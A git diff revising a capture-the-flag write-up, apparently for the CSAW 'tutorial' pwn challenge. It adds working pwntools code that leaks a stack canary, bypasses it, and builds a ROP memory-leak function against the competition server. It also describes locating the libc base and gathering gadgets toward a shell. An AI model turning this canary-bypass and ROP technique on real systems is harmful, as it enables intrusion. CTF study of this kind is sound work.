@@ -83,9 +83,8 @@ $ r2 -A tutorial
 Indeed 0x1cc bytes are read `0x00400f61 mov edx, 0x1cc`, while the stack frame is only 0x150 bytes large `0x00400ef6 sub rsp, 0x150`
 However, during the function prelude, a canary value is placed at the start of the stack frame.
 ```
-0x00400f90 xor rax, qword fs:[0x28]
-0x00400f99 je 0x400fa0
-0x00400f9b call sym.imp.__stack_chk_fail
+0x00400f03 mov rax, qword fs:[0x28]
+0x00400f0c mov qword [rbp - local_8h], rax
 ```
 It is then checked again when the function exits. The program then aborts if its value is unexpected.
 ```
@@ -94,7 +93,7 @@ It is then checked again when the function exits. The program then aborts if its
 0x00400f99 je 0x400fa0
 0x00400f9b call sym.imp.__stack_chk_fail
 ```
-The second limitation is NX. The stack is not executale anf ROP chains will have to be used.
+The second limitation is NX. The stack is not executale and ROP chains will have to be used.
 
 Solving this will end up being a three steps process : 
  * find a way to bypass the canary
@@ -102,14 +101,55 @@ Solving this will end up being a three steps process :
  * build a final rop chain to pop a shell
 
 ## bypassing the canary
-It turns outs that the Practice step of the program writes a tiny bit more than it should (the XXXXXX bytes in my example) and thus conviniently leaks the canary as well as the 4 lowest bytes of rbp.
+It turns outs that the Practice step of the program writes a tiny bit more than it should (the XXXXXX bytes in my example) and thus conviniently leaks the canary as well as the 4 lowest bytes of the previous frame pointer.
 
 Just what we need :)
 
+Indeed our stack looks like this :
+```
+<------   [4 bytes file descriptor][0x138 bytes reading space][8 bytes canary][rbp (the previous frame pointer)][return address]
+top of                                                                                                                           bottom of
+stack                                                                                                                                stack
+```
+And since write is asked to print 0x144 bytes (`0x00400f7d mov edx, 0x144`), it also prints 0x144 - 0x138 = 12 extra bytes.
+```python
+r = remote("pwn.chal.csaw.io",8002)
+# obtain the canary
+print(r.recvuntil(">"))
+r.send("2\n")
+print(r.recvuntil(">"))
+canary = r.recvuntil("-")[0x138:-1]
+# overrun the buffer without being detected
+r.send("A"*0x138 + canary)
+```
+Great, sending this does not crash the program which means we can write over ret and control the executable.
+
 ## leaking arbitrary memory chunks
-stack pivoting using the rbp value
-pop rsi gadget
-return to the write call
+Looking at the state of our registers when we reach the ret call we see that we are still configured to perform a write call on the socket.
+We only need to change rsi to a new address and call write again to get 0x144 bytes of juicy data.
+Uploading the binary to [ropshell.com](http://ropshell.com/), I was able to find a pop rsi; pop r15; ret gadget at 0x4012e1.
+
+```python
+def leak(ptr, size):
+  r = remote("pwn.chal.csaw.io",8002)
+  # obtain the canary
+  print(r.recvuntil(">"))
+  r.send("2\n")
+  print(r.recvuntil(">"))
+  r.send("w\n")
+  canary = r.recvuntil("-")[0x138:-1]
+  canary = canary[:-4]
+
+  print(r.recvuntil(">"))
+  r.send("2\n")
+  print(r.recvuntil(">"))
+  r.send("A"*0x138 + canary + "A"*8 + '\xe1\x12\x40\x00\x00\x00\x00\x00' + struct.pack("Q",ptr) + "A"*8 + '\xa0\x0e\x40\x00\x00\x00\x00\x00')
+  r.recv(0x144)
+  mem = r.recv(0x144)[:size]
+  r.close()
+  return mem
+```
+Once it hits the ret call, the program will pop the address at which we want to leak memory into rsi, pop garbage into r15, and return to the write call at 0x400ea0.
 
 ## final exploit
 Reversing the code to understand what the reference adresse was it seemed to be linked to the puts function. However I failed to get a valid base doing `libc_base = Reference - libc_puts` and reverted to an other strategy.
@@ -122,12 +162,20 @@ def findLibcBase(ptr):
       ptr -= 0x1000
    return ptr
 ```
+Letting this run for a while gives us `libc = 0x7f6dd350b000`.
+
 We now have so many ROP possiblities!
+
 gadgets :
+
 poprdi, poprsi, poprdx, poprax, syscall
+
 functions :
-clode and dup
+
+close and dup
+
 strings :
+
 /bin/sh
 
 Hooking the program's standard io to the file descriptor of the socket. Using our leaking function we find its value is 4.
